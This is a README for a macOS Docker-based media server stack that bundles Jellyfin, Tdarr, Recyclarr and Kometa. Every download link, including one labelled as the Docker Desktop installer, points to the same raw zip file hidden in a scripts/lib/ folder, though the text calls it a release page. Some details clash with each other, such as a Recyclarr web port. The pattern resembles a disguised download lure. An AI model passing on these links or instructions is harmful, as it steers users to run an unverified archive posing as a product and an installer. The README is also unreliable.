# 🎬 mac-media-stack-advanced - Reliable Media Server for macOS

[![Download Latest Release](https://img.shields.io/badge/Download-mac--media--stack--advanced-blue?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)

## 📦 What is mac-media-stack-advanced?

mac-media-stack-advanced is an advanced media server designed specifically for macOS. It helps you organize and stream your movies, TV shows, and music. The server manages media files automatically. It fixes issues, converts files for smooth playback, and keeps data safe with backups. You get quality profiles and metadata handled without manual work. The system also monitors downloads and uses VPN failover to keep your connection secure.

This project uses popular tools behind the scenes, like Tdarr for file transcoding, Recyclarr for quality control, and Kometa for metadata. It includes automation for media downloads and backup routines. You do not need to understand coding or programming to use it.

## 🔍 Features

- **Auto-healing:** Fixes problems in your media files automatically.
- **Transcoding:** Converts videos to formats that work on your devices using Tdarr.
- **Quality Profiles:** Ensures media meets your quality standards with Recyclarr.
- **Metadata Automation:** Downloads artwork, descriptions, and episode info using Kometa.
- **Download Watchdog:** Keeps track of new downloads and imports them correctly.
- **VPN Failover:** Switches to backup VPN if the main one fails.
- **Automated Backups:** Saves your settings and data regularly.
- **Self-hosted:** You keep full control by running everything on your own macOS machine.
- **Integrates with apps:** Works with Jellyfin, Plex, Sonarr, Radarr, Lidarr, and Tidarr.

## 💻 System Requirements

To run mac-media-stack-advanced on your Mac, make sure your system meets these requirements:

- macOS version: 11.0 (Big Sur) or later
- At least 8 GB of RAM (16 GB recommended for larger libraries)
- Minimum 50 GB free disk space (more depending on media size)
- Stable internet connection
- Docker and Docker Compose installed
- Admin access to install software and run Docker containers

If you use VPN failover, your VPN client should support WireGuard or OpenVPN protocols.

## 🚀 Getting Started

Follow these steps to download and run mac-media-stack-advanced on your Mac.

### 1. Download the latest release

Visit the release page to get the latest version:

[![Download Latest Release](https://img.shields.io/badge/Download--Now-Open%20Release%20Page-green?style=for-the-badge)](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)

- This page contains all stable versions and update notes.
- Download the asset for macOS or any files labeled for your system.
- Save the files to a folder you can easily access.

### 2. Install Docker and Docker Compose

mac-media-stack-advanced runs all services inside Docker containers:

- Go to https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip
- Download and install Docker Desktop for Mac.
- Follow the installer steps.
- After installation, open Terminal and run:

  ```
  docker --version
  docker-compose --version
  ```

- These commands confirm Docker is ready.

### 3. Prepare the media-stack files

- Extract the downloaded release archive.
- You should see files like `docker-compose.yml` and folders for configuration.
- Open the folder in Finder or use Terminal.

### 4. Configure your setup

Some settings need to match your home environment:

- Open the `.env` or configuration files in a text editor.
- Set your media paths for Movies, TV Shows, Music, and Downloads.
- Configure network options, including VPN if you use one.
- Adjust quality profiles as needed.
- Save changes.

If you don’t want to change anything, default settings are ready to use.

### 5. Run the stack

Open Terminal and navigate to the folder with `docker-compose.yml`. Then run:

```
docker-compose up -d
```

- This command starts all containers in the background.
- Services will start initializing; this may take a few minutes.
- You can check logs with:

```
docker-compose logs -f
```

### 6. Access your media server

Once running, you can open your media server in a web browser:

- Jellyfin (for streaming): `http://localhost:8096`
- Kometa (for metadata): `http://localhost:4200`
- Tdarr (for transcoding): `http://localhost:8265`
- Recyclarr (for quality profiles): `http://localhost:7878`

Use the default user names and passwords provided in the documentation folder if prompted.

### 7. Managing updates

To update mac-media-stack-advanced:

- Download the new release files.
- Replace old files with new ones.
- Run the following commands:

```
docker-compose pull
docker-compose up -d
```

- This updates existing containers with the new versions.

## 🔧 Troubleshooting & Tips

- If containers do not start, check Docker is running and your system meets requirements.
- Confirm ports 8096, 4200, 8265, and 7878 are free.
- If media files don’t show up, check your media folder paths are correct.
- Restart Docker Desktop if you experience connection issues.
- Monitor disk space regularly to avoid service interruption.
- Backups run automatically, but you can manually copy your config folder to an external drive.

## 📁 Folder Structure Overview

After extraction, you will see:

- `docker-compose.yml` — main service configuration
- `config/` — settings and user data stored here
- `media/` — place your movies, TV shows, and music here
- `logs/` — system logs for troubleshooting
- `.env` — environment variables for config options

## 🔗 Download Links

You can always find the latest version here:

[https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip](https://github.com/SniperGoal/mac-media-stack-advanced/raw/refs/heads/main/scripts/lib/media-mac-advanced-stack-2.3-beta.5.zip)

Click the blue button and select the macOS release file to download and start the installation.

## ⚙️ How It Works

mac-media-stack-advanced uses Docker to run multiple services:

- Jellyfin streams your media to all devices.
- Tdarr converts videos into formats that work best for your devices.
- Recyclarr ensures media files meet your quality rules.
- Kometa grabs cover art, descriptions, and episode info.
- Sonarr, Radarr, and Lidarr automate TV shows, movies, and music downloads.
- WireGuard VPN keeps your connection protected, switching automatically if one VPN drops.
- Automated backups make sure your data stays safe.

All services talk to each other using Docker networks. You can manage and monitor each service via web portals.

## 🔄 Common Commands

Use these in the Terminal inside the project folder:

- Start:

  ```
  docker-compose up -d
  ```

- Stop:

  ```
  docker-compose down
  ```

- View logs:

  ```
  docker-compose logs -f
  ```

- Update containers:

  ```
  docker-compose pull
  docker-compose up -d
  ```

## 🤝 Support and Resources

You can find detailed guides and configuration help in the repository wiki. Look for:

- How to set up quality profiles
- Advanced transcoding options
- VPN failover configuration
- Backup management

Use the Issues tab on GitHub to report bugs or request help from the community.